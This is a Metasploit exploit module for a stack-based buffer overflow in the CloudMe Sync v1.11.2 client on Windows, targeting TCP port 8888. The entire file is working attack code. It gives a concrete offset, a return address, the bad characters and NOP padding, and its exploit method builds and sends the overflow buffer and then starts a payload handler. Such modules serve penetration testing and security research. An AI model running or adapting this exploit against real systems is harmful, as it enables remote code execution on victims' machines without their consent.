##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'CloudMe Sync v1.11.2',
      'Description' => %q{
        This module exploits a stack-based buffer overflow vulnerability
        in CloudMe Sync v1.11.2 client application. This module has been
        tested successfully on Windows 10.
      },
      'License' => MSF_LICENSE,
      'Author' => [
        'Andy Bowden',                  # original exploit author
        'mekhalleh (RAMELLA Sébastien)' # module author (Zeop Entreprise)
      ],
      'References' => [
        [ 'EDB', '48389' ],
        [ 'EDB', '48499' ]
      ],
      'DefaultOptions' => {
        'EXITFUNC' => 'thread'
      },
      'Platform' => 'win',
      'Payload' => {
        'BadChars' => "\x00\x0a\x0d",
      },
      'Targets' => [
        ['CloudMe Sync v1.11.2',
          {
            'Offset' => 1052,
            'Ret' => 0x68a842b5, # push esp, ret
            'Max' => 1500
          }
        ],
      ],
      'Privileged' => false,
      'DisclosureDate' => '2020-04-27',
      'DefaultTarget' => 0
    ))

    register_options([Opt::RPORT(8888)])
  end

  def exploit
    connect

    buffer = make_nops(target['Offset'])
    buffer << [target.ret].pack('V')
    buffer << make_nops(30)
    buffer << payload.encoded
    buffer << make_nops(target['Max'] - buffer.length)

    sock.put(buffer)
    handler
  end

end
